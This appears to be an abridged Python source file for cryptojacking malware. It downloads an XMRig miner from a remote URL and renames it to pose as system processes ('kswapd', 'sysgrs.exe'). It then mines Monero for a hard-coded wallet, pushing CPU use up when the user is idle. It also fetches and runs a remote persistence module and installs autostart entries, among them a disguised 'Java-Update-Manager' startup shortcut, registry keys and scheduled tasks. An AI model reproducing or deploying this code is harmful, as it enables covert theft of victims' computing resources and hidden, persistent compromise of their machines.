...
def gettasklistwin():
	...
	tasks = subprocess.Popen(["tasklist"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, startupinfo=startupinfo)
	
	tasksout = tasks.stdout.read().split("\r\n")
	p = []
	for task in tasksout:
	...
	processname = []
	for process in p:
		processname.append(process["image"])
	return processname

def gettasklistunix():
	processes = ""
	for p in psutil.process_iter():
		pexec = ' '.join(p.cmdline())
		if len(pexec) != 0:
...
class Payload():
			...
			try:
				...
				if not self.xmrig_path:
					...
					if os.name != "nt":
						...
						self.xmrig_path = self.wget('https://raw.githubusercontent.com/275178125/7829157215/master/xmrig/xmrig_{0}'.format(sys.platform), path="/tmp/kswapd")
						
					else:
						writepath = os.getenv("TEMP")+"\\"+"kswapd"
						self.xmrig_path = self.wget('https://raw.githubusercontent.com/275178125/7829157215/master/xmrig/xmrig_{0}'.format(sys.platform), path=writepath)
					
					if os.name == 'nt' and not self.xmrig_path.endswith('.exe'):
						try:
							os.rename(self.xmrig_path, "\\".join((self.xmrig_path).split("\\")[0:-1]) + "\\" + 'sysgrs.exe')
						except:
							pass
						self.xmrig_path = "\\".join((self.xmrig_path).split("\\")[0:-1]) + "\\" + 'sysgrs.exe'
						
					
					os.chmod(self.xmrig_path, 755)
					
					#workername = socket.gethostname()
					workername = str(self._get_info()["public_ip"].encode("ascii")).replace(".", "-")
					params = self.xmrig_path + " --url us-west.minexmr.com:80 --user 43EgeMTU9EKMPq9s8HTw3bDEAdhtfqWiXPdRmKmJqfrmcDfNHQczrnbEfS6vENouF4ZtsFGGw5uLt9pRzgxBFWBh5MpoR6Z --donate-level 1 --coin monero --cpu-max-threads-hint {cpurate} -k --rig-id={workername} -r 99".format(cpurate=cpurate, workername=workername)
					...
					workername = socket.gethostname()
					params = self.xmrig_path + " --url us-west.minexmr.com:80 --user 43EgeMTU9EKMPq9s8HTw3bDEAdhtfqWiXPdRmKmJqfrmcDfNHQczrnbEfS6vENouF4ZtsFGGw5uLt9pRzgxBFWBh5MpoR6Z --donate-level 1 --coin monero --cpu-max-threads-hint {cpurate} -k --rig-id={workername}".format(cpurate=cpurate, workername=workername)
	...
	def execute(self, args):
		...
		if os.path.isfile(path):
			...
			try:
				...
				self.execute.process_list[name] = subprocess.Popen(args, startupinfo=info, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
				...
				try:
					...
					if os.name == "nt":
						startupinfo = subprocess.STARTUPINFO()
						startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
						self.execute.process_list[name] = subprocess.Popen(args, 0, None, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, startupinfo=startupinfo)
						
						return "Running '{}' in a new process".format(name)
					else:
						self.execute.process_list[name] = subprocess.Popen(args, 0, None, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	...
	def persistence(self, args=None):
		...
		try:
			...
			result = []
			for method in persistence._methods:
				if action == "all" or action == method:
					
					exec("result.append( persistence._add_%s() )"%(method))
				
			return result
		except Exception as e:
			log("persistence error: %s"%(str(e)))
	...
	def minecalc(self):
		...
		while True:
			...
			if os.name == "nt":
				if "sysgrs.exe" in gettasklistwin():
					miner_on = True
				else:
					miner_on = False
			else:
				if "/tmp/kswapd --url" in gettasklistunix():
					miner_on = True
				else:
					miner_on = False

			if idletime >= 120: 
				if user_on == 1 or user_on == 3 or miner_on == False:
					self.miner("run", "100")
				user_on = 0
			else:
				if user_on == 0 or user_on == 3 or miner_on == False:	
					self.miner("run", "40")
				user_on = 1
			time.sleep(10) 
	...
	def run(self):
		if os.name == 'nt': 
			minecalcprocess = threading.Thread(target=self.minecalc, args=())
			minerprocess.start()
		else:
			minecalcprocess = threading.Thread(target=self.minecalc, args=())
			minecalcprocess.start()

		if os.name == "nt":
			self.persistence("add startup_file")
			
			value = sys.argv[0]
			fname = value.split("\\")[-1]
			dest = os.getenv("APPDATA")+"\\"+fname
			appdata = os.path.expandvars("%AppData%")
			startup_dir = os.path.join(appdata, r'Microsoft\Windows\Start Menu\Programs\Startup')
			startup_file = os.path.join(startup_dir, 'Java-Update-Manager.lnk')
			dest = os.path.join(appdata, fname)
			shell = win32com.client.Dispatch("WScript.Shell") 
			shortcut = shell.CreateShortCut(startup_file)
			shortcut.Targetpath = dest
			shortcut.IconLocation = r'C:\path\to\icon\resource.ico'
			shortcut.WindowStyle = 7 
			shortcut.save()
			self.persistence("add registry_key")
			self.persistence("add scheduled_task")
			self.persistence("add powershell_wmi")
			self.persistence("add hidden_file")
		else:
			self.persistence("add all")
		minecalcprocess.join()
...
if __name__ == '__main__':
	if os.name == "nt":
		currentfname = str(__file__).split(".")[0]+".exe"
		currenttasks = gettasklistwin()
		if currenttasks.count(currentfname) > 2:
			sys.exit(1)
	_payload = Payload()
	persistence = import_cdn("https://raw.githubusercontent.com/275178125/7829157215/master/8125851289/persistence.py")
	_payload.run()
